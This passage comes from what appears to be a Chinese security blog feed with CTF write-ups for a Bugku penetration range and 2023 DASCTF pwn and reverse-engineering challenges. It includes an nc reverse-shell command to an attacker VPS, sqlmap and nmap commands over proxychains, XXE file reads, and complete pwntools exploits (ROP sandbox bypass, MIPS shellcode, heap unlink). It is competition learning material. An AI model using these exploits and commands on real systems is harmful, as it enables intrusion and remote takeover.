<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134403149.png?imageSlim" alt="image-20231205134403149"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134604726.png?imageSlim" alt="image-20231205134604726"></p>
<span id="more"></span>

<h2 id="场景二、场景三"><a href="#场景二、场景三" class="headerlink" title="场景二、场景三"></a>场景二、场景三</h2><p>因为外网只开了一个80服务，没有什么可打的点，尝试利用ssrf探测内网。先看看hosts文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205134952040.png?imageSlim" alt="image-20231205134952040"></p>
<p>发现了一个192.168.0.2的内网，访问192.168.0.2发现就是这个爬取的网页，用ssrf扫一下内网看看。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205135807585.png?imageSlim" alt="image-20231205135807585"></p>
<p>找到一个192.168.0.10、192.168.0.138和192.168.0.250的地址，如下图所示。发现其中192.168.0.10和场景二给的提示很像。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205135528059.png?imageSlim" alt="image-20231205135528059"></p>
<p>尝试用ssrf扫一下目标网站的目录，我是用了github上的一个目录字典扫的。扫出来了两个可以用的目录，一个是&#x2F;phpinfo.php，一个是&#x2F;shell.php，后者应该就是被黑放的木马。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205141048418.png?imageSlim" alt="image-20231205141048418"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205141003467.png?imageSlim" alt="image-20231205141003467"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205143349030.png?imageSlim" alt="image-20231205143349030"></p>
<p>找到根目录的flag，但是发现竟然是场景三的，场景二的应该在网站目录里。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205143658646.png?imageSlim" alt="image-20231205143658646"></p>
<p>利用命令查看网卡信息，发现还有内网10.10.0.5。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205143957272.png?imageSlim" alt="image-20231205143957272"></p>
<p>尝试反弹shell，bash没成功，php也没成功，最后试了一下nc成功了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc &lt;vpsip&gt; 6666 -e /bin/sh</span><br></pre></td></tr></table></figure>

<p>进入后根据根目录的文件发现是一个用docker起的服务。</p>
<h2 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h2><p>之前我们还找到一个192.168.0.138的地址，挂上代理后查看发现可能存在sql注入。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205151922951.png?imageSlim" alt="image-20231205151922951"></p>
<p>直接sqlmap嗦就能出来，最简单的联合注入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains sqlmap -u &quot;http://192.168.0.138/?id=1&quot; --current-user --dbms=mysql -D bugku_sql -T flag --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205152629356.png?imageSlim" alt="image-20231205152629356"></p>
<h2 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h2><p>很抽象的是fscan扫不出来，会报错。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205153509045.png?imageSlim" alt="image-20231205153509045"></p>
<p>尝试用arp进行主机发现，但是也失败了，算了放一边。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205184344823.png?imageSlim" alt="image-20231205184344823"></p>
<h2 id="场景七、场景八"><a href="#场景七、场景八" class="headerlink" title="场景七、场景八"></a>场景七、场景八</h2><p>之前还发现了一个192.168.0.250的地址，访问看看，发现是一个用户登陆的界面。抓包尝试爆破。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205185210658.png?imageSlim" alt="image-20231205185210658"></p>
<p>竟然是解析xml，那么直接先测试是否存在XXE了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205185710518.png?imageSlim" alt="image-20231205185710518"></p>
<p>成功读取到了文件，根据之前的经验，也是一个在根目录一个在网站目录下。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205185832467.png?imageSlim" alt="image-20231205185832467"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205190008543.png?imageSlim" alt="image-20231205190008543"></p>
<h2 id="场景五-again"><a href="#场景五-again" class="headerlink" title="场景五 again"></a>场景五 again</h2><p>看一下hosts文件是否能够找到收获，没有其他的内网信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205191552317.png?imageSlim" alt="image-20231205191552317"></p>
<p>穷途末路的，只能尝试用nmap扫10.10.0.0段地址的常用端口，看看是不是能探测到。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.0.0-255 -p80</span><br></pre></td></tr></table></figure>

<p>终于找到了最后的主机10.10.0.22。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205192453859.png?imageSlim" alt="image-20231205192453859"></p>
<p>bugkucms？先扫扫看目录呢，用dirsearch扫出来一个后台&#x2F;admin.php。尝试弱口令爆破，admin&#x2F;admin登陆成功，文件夹管理？上传木马。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205194106913.png?imageSlim" alt="image-20231205194106913"></p>
<h2 id="场景六"><a href="#场景六" class="headerlink" title="场景六"></a>场景六</h2><p>接场景五。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205194152158.png?imageSlim" alt="image-20231205194152158"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 DASCTF X 0psu3</title>
    <url>/2023/12/01/CTF/2023DASCTF%20X%200psu3/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ASadStory"><a href="#ASadStory" class="headerlink" title="ASadStory"></a>ASadStory</h3><p>程序逻辑不是很难看。主要难点在于泄露了地址，但是关闭了标准输出，解决方法就是通过标准错误去输出信息；难点二是沙盒禁用了open，但是我们可以用openat来打开文件，注意调用的格式，<code>openat(AT_FDCWD, &quot;./flag&quot;, 0)</code>，AT_FDCWD是指代当前目录，宏定义的值是-100，也就是0xffffffffffffff9c。整体思路就是首先修改got表中的read函数至syscall，调用write向标准错误输出libc地址，最后就是orw。</p>
<span id="more"></span>

<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># =================================</span></span><br><span class="line"><span class="comment">#  0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="comment">#  0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span></span><br><span class="line"><span class="comment">#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="comment">#  0003: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0006</span></span><br><span class="line"><span class="comment">#  0004: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0006</span></span><br><span class="line"><span class="comment">#  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"><span class="comment">#  0006: 0x06 0x00 0x00 0x00000000  return KILL</span></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = process(&quot;./challenge&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28900</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./challenge&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;1.yes / 2.no\n&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;2.痛苦面具\n&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;函数的地址:&quot;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x1249</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sh.recvrepeat(<span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">pld = flat(cyclic(<span class="number">0x38</span>),</span><br><span class="line">           <span class="comment"># read -&gt; syscall</span></span><br><span class="line">           code_base + <span class="number">0x000000000000163A</span>,</span><br><span class="line">           <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, code_base + elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="number">1</span>, code_base + elf.got[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">           code_base + <span class="number">0x0000000000001620</span>,</span><br><span class="line">           [<span class="number">0</span>] * <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">           <span class="comment"># write</span></span><br><span class="line">           code_base + <span class="number">0x000000000000163A</span>,</span><br><span class="line">           <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, code_base + elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="number">0x10</span>, code_base + elf.got[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">           code_base + <span class="number">0x0000000000001620</span>,</span><br><span class="line">           [<span class="number">0</span>] * <span class="number">7</span>,</span><br><span class="line">           code_base + <span class="number">0x0000000000001468</span>,</span><br><span class="line">           )</span><br><span class="line">sh.sendline(pld)</span><br><span class="line">sh.send(<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x10dfd0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000083f6c</span></span><br><span class="line"></span><br><span class="line">pld = flat(cyclic(<span class="number">0x38</span>),</span><br><span class="line">           <span class="comment"># read ./flag</span></span><br><span class="line">           p_rax_r, <span class="number">0</span>,</span><br><span class="line">           p_rdi_r, <span class="number">0</span>,</span><br><span class="line">           p_rsi_r, code_base + <span class="number">0x0000000000004100</span>,</span><br><span class="line">           p_rdx_r, <span class="number">0x10</span>,</span><br><span class="line">           syscall_ret,</span><br><span class="line"></span><br><span class="line">           <span class="comment"># openat(AT_FDCWD, &quot;./flag&quot;, 0)</span></span><br><span class="line">           p_rax_r, <span class="number">0x101</span>,</span><br><span class="line">           p_rdi_r, <span class="number">0xffffffffffffff9c</span>,</span><br><span class="line">           p_rsi_r, code_base + <span class="number">0x0000000000004100</span>,</span><br><span class="line">           p_rdx_r, <span class="number">0</span>,</span><br><span class="line">           syscall_ret,</span><br><span class="line">           </span><br><span class="line">           <span class="comment"># read</span></span><br><span class="line">           p_rax_r, <span class="number">0</span>,</span><br><span class="line">           p_rdi_r, <span class="number">1</span>,</span><br><span class="line">           p_rsi_r, code_base + <span class="number">0x0000000000004200</span>,</span><br><span class="line">           p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">           syscall_ret,</span><br><span class="line"></span><br><span class="line">           <span class="comment"># write</span></span><br><span class="line">           p_rax_r, <span class="number">1</span>,</span><br><span class="line">           p_rdi_r, <span class="number">2</span>,</span><br><span class="line">           p_rsi_r, code_base + <span class="number">0x0000000000004200</span>,</span><br><span class="line">           p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">           syscall_ret,</span><br><span class="line">           )</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001490)&#x27;)</span></span><br><span class="line">sh.sendline(pld)</span><br><span class="line">sh.send(<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="shaopi"><a href="#shaopi" class="headerlink" title="shaopi"></a>shaopi</h3><p>Mips的pwn，一个基础的栈溢出，但是要会看懂mips的汇编和使用IDA的插件mipsrop，通过学习下面的文章完成了题目。</p>
<blockquote>
<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">xuanxuanblingbling.github.io&#x2F;ctf&#x2F;pwn&#x2F;2020&#x2F;09&#x2F;24&#x2F;mips&#x2F;</a></p>
</blockquote>
<p>利用IDA中的两个指令来找gadget。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mipsrop.stackfinders()</span><br><span class="line">mipsrop.find(&quot;move $t9,$a2&quot;)</span><br></pre></td></tr></table></figure>

<p>根据栈恢复的汇编，我们可以通过溢出控制$fp和$sp。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00400CB4 94 00 BF 8F                   lw      $ra, 0x90+var_s4($sp)</span><br><span class="line">.text:00400CB8 90 00 BE 8F                   lw      $fp, 0x90+var_s0($sp)</span><br><span class="line">.text:00400CBC 98 00 BD 27                   addiu   $sp, 0x98</span><br><span class="line">.text:00400CC0 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:00400CC4 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>

<p>结合下面利用mipsrop找到的汇编，就可以实现读取栈地址，然后跳转到栈地址上存放的shellcode。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0043965C | addiu $a2,$sp,0x68+var_10 | jalr $fp</span><br><span class="line">0x0040ABB8 | move $t9,$a2 | jalr $a2</span><br></pre></td></tr></table></figure>

<p>关于如何调试有两种办法。</p>
<ul>
<li><p>方法一</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -g 12345 ./challenge</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"></span><br><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">target remote localhost:12345</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二</p>
<p>在pwntools中直接调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = gdb.debug(<span class="string">&quot;./challenge&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>最后注意pwntools生成的shellcode太大了所以网上找了一段shellcode。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">sh = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./challenge&quot;</span>])</span><br><span class="line"><span class="comment"># sh = gdb.debug(&quot;./challenge&quot;, &#x27;b *0x00400CB4&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0043965C | addiu $a2,$sp,0x68+var_10 | jalr $fp</span></span><br><span class="line"><span class="comment"># 0x0040ABB8 | move $t9,$a2 | jalr $a2</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your passphrase: &#x27;</span>, <span class="string">&#x27;三元一串十元三串&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.mips.linux.sh())</span></span><br><span class="line"><span class="comment"># execve(&quot;/bin//sh&quot;, 0, 0)</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lui $t6,0x6e69</span></span><br><span class="line"><span class="string">ori $t6,$t6,0x622f</span></span><br><span class="line"><span class="string">sw $t6,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lui $t7,0x6873</span></span><br><span class="line"><span class="string">ori $t7,$t7,0x2f2f</span></span><br><span class="line"><span class="string">sw $t7,32($sp)</span></span><br><span class="line"><span class="string">sw $zero,36($sp) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">la $a0,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">addiu $a2,$zero,0</span></span><br><span class="line"><span class="string">addiu $v0,$zero,4011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">pld = cyclic(<span class="number">0x40</span>) + p32(<span class="number">0x0040ABB8</span>) + p32(<span class="number">0x0043965C</span>)</span><br><span class="line">pld = pld.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;a&#x27;</span>) + shellcode</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Congratulation!\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="garbage"><a href="#garbage" class="headerlink" title="garbage"></a>garbage</h3><p>一道基础的高版本堆题，需要满足以下利用条件，<strong>一是需要可以unlink进行脱链；二是能够获取到存放堆指针的地方</strong>，这里没有开pie，所以我们能够找到堆指针存放的数组地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># fake chunk</span><br><span class="line">pre_size		0</span><br><span class="line">size				0x831</span><br><span class="line">fk					&amp;fake_chunk - 24</span><br><span class="line">bk					&amp;fake_chunk - 16</span><br></pre></td></tr></table></figure>

<p>攻击成功后我们能够修改堆指针数组里的值为任意，如下图所示：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231205113754711.png?imageSlim" alt="image-20231205113754711"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn_name&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./challenge&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;172.10.0.9&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx of garbage: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;size of garbage: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;content of garbage: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx of garbage: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx of garbage: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;your choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx of garbage: &#x27;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">    sa(<span class="string">&#x27;content of garbage: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219c0a</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(ru(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">edit(<span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0x831</span>, <span class="number">0x404060</span>-<span class="number">3</span>*<span class="number">8</span>, <span class="number">0x404060</span>-<span class="number">2</span>*<span class="number">8</span>, <span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">edit(<span class="number">1</span>, flat([<span class="string">b&#x27;a&#x27;</span>] * <span class="number">0x410</span>, <span class="number">0x830</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">edit(<span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>], <span class="number">0x404060</span>, <span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, flat(<span class="number">0xfbad1800</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>], libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>] + <span class="number">0x10</span>, <span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">leak_stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line">ret_addr = leak_stack - <span class="number">0x160</span></span><br><span class="line">lg(<span class="string">&#x27;ret_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">edit(<span class="number">1</span>, flat(ret_addr, <span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">edit(<span class="number">0</span>, flat(libc_base + <span class="number">0x000000000002a3e6</span>,</span><br><span class="line">             libc_base + <span class="number">0x000000000002a3e5</span>,</span><br><span class="line">             libc_base + <span class="number">0x00000000001d8698</span>,</span><br><span class="line">             libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], <span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><p>尝试uncompyle6还原py，报错Magic头有问题，用010看一下发现头被篡改了需要修改。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231130183532552.png?imageSlim" alt="image-20231130183532552"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line">importlib.util.MAGIC_NUMBER.<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>

<p>得到python3.11.0的MagicNumber是a70d0d0a。uncompyle6用不了，尝试pycdc进行反编译。尝试了一下用GPT翻译，发现翻译得也还不错，虽然也有一点错误。</p>
<p>得到部分源码，但是还有报错，得手搓一部分。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ezpython.pyc (Python 3.11)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adjust_length</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &gt; <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span>[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yuanshen</span>(<span class="params">array, start, end</span>):</span><br><span class="line">    num = <span class="built_in">len</span>(array)</span><br><span class="line">    dis = [</span><br><span class="line">        <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * num</span><br><span class="line">    tree = [</span><br><span class="line">        <span class="literal">False</span>] * num</span><br><span class="line">    parent = [</span><br><span class="line">        -<span class="number">1</span>] * num</span><br><span class="line">    dis[start] = <span class="number">0</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle 